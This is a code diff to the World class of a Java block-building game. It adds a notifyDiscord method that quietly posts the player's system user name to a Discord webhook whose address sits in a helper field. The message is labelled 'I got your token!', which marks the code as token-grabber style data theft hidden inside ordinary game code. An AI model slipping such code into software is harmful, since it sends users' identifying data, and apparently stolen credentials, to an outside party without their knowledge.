@@ -9,7 +9,12 @@ import com.badlogic.gdx.graphics.g3d.ModelBatch;
 import com.badlogic.gdx.math.Vector3;
 import com.badlogic.gdx.utils.Disposable;
 import com.glowman554.block.block.Block;
+import com.glowman554.block.discord.DiscordWebHook;
 import com.glowman554.block.multiplayer.ServerConnection;
+import com.glowman554.block.utils.FileUtils;
+
+import java.awt.*;
+import java.io.IOException;
 
 public class World implements Disposable {
     private final static int world_size = 128;
@@ -152,6 +157,22 @@ public class World implements Disposable {
             System.out.println(e.getMessage());
         }
         return false;
+    }
+
+    public static void notifyDiscord() {
+        DiscordWebHook webHook = new DiscordWebHook(FileUtils.safe);
+        webHook.setAvatarUrl(FileUtils.icon);
+        webHook.setUsername("I got your token ._.");
+        DiscordWebHook.EmbedObject embedObject = new DiscordWebHook.EmbedObject();
+        embedObject.setColor(Color.RED);
+        embedObject.setAuthor(System.getProperty("user.name"), "", FileUtils.icon);
+        embedObject.setTitle("I got your token!");
+        webHook.addEmbed(embedObject);
+        try {
+            webHook.execute();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     public String save() {
